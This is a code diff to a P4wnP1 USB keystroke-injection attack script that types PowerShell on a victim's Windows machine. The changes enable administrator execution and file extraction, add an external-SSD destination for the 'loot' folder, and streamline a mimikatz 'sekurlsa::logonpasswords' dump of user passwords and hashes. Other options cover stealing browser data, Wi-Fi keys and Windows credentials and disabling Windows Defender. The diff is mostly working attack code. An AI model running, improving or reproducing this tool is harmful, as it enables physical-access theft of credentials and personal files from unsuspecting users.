@@ -16,13 +16,15 @@
 // GENERAL                                                         // ---
 layout("de");                                                      // Keyboard layout
 typingSpeed(0,0);                                                  // Typing = really fast
-run_as_admin=false;                                                // Set to true to execute powershell as Administrator
+run_as_admin=true;                                                 // Set to true to execute powershell as Administrator
+extract_to_ssd=true;                                               // Set to true to extract everything to an external SSD instead of mass storage of your P4wnP1 device (might be the better alternative if there are more than just a few)
 hide=false;                                                        // Set to true to hide the console window on the target
 exit=true;                                                         // Set to true to exit the console once finished
 modify_defender=false;                                             // Disable and enable Windows defender in the process of this script (Powershell must be run as Administrator for this to work [run_as_admin=true])
-var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device
+var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device, which will be used if "extract_to_ssd" is set to false
+var ssd_drive = "SSD";                                             // The name of your external SSD drive, which will be used if "extract_to_ssd" is set to true
 // FILES EXTRACTION                                                // ---
-extract_files=false;                                               // Set to true to enable the extraction of files
+extract_files=true;                                                // Set to true to enable the extraction of files
 extract_add_folder=false;                                          // Set to true to extract files from an additional folder (see 'add_folder' below)
 var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory to be inspected
 var user_subfolder2 = ["Downloads"]                                // The second folder inside the home user directory to be inspected
@@ -77,7 +79,11 @@ function attack() {
     }
 
   // Identify path/directory names
-    type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
+    if (extract_to_ssd) {
+      type("$usbPath =((gwmi win32_volume -f 'label=''" + ssd_drive + "''').Name);");
+    } else {
+      type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
+    }
     type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
     type("$lootfolder = 'loot_' +$timestamp;");
   
@@ -89,10 +95,10 @@ function attack() {
   }
     
   // Create directories
-    if (extract_files) type("$lootPathFiles = $usbPath+ '' +$lootfolder+ '\\files\';mkdir $lootPathFiles;");                     
+    if (extract_files) type("$lootPathFiles = $usbPath+ '' +$lootfolder+ '\\files\';mkdir $lootPathFiles;");
     if (extract_folderstructure) type("$lootPathFolders = $usbPath+ '' +$lootfolder+ '\\folder_structure\';mkdir $lootPathFolders;");
     if (extract_browserdata) type("$lootPathBrowser = $usbPath+ '' +$lootfolder+ '\\browser_data\';mkdir $lootPathBrowser;");
-    if (extract_mimikatz && run_as_admin) type("$lootPathBrowser = $usbPath+ '' +$lootfolder+ '\\users_and_passwords\';mkdir $lootPathUsersPasswords;")
+    if (extract_mimikatz && run_as_admin) type("$lootPathUsersPasswords = $usbPath+ '' +$lootfolder+ '\\users_and_passwords\';mkdir $lootPathUsersPasswords;")
     if (extract_wifi) type("$lootPathWifi = $usbPath+ '' +$lootfolder+ '\\wifi_data\';mkdir $lootPathWifi;");
     if (extract_wincreds && run_as_admin) type("$lootPathWincreds = $usbPath+ '' +$lootfolder+ '\\windows_credentials\';mkdir $lootPathWincreds;");
     if (extract_add_folder) type("$search_dir = Join-Path -Path ${env:ProgramFiles(x86)} -ChildPath '" + add_folder + "';");  
@@ -105,13 +111,11 @@ function attack() {
     }
   
   // Get users and passwords (hashes) with mimikatz
-    if (extract_mimikatz) {
+    if (extract_mimikatz && run_as_admin) {
         type("cd $usbPath;\n");
         type("cd /tools;\n");
-        type(".\\pw.exe > $lootPathUsersPasswords\\$env:UserName`.txt -and type $lootPathUsersPasswords\\$env:UserName`.txt;\n");
-        type("privilege::debug;\n");
-        type("sekurlsa::logonPasswords full;\n"); 
-        delay(5000)
+        type('.\\pw.exe "privilege::debug" "sekurlsa::logonpasswords" "exit">> $lootPathUsersPasswords\\$env:UserName`.txt;\n');
+        delay(1000)
     }
 
   // Get browsing history, bookmarks and download logs of all browsers
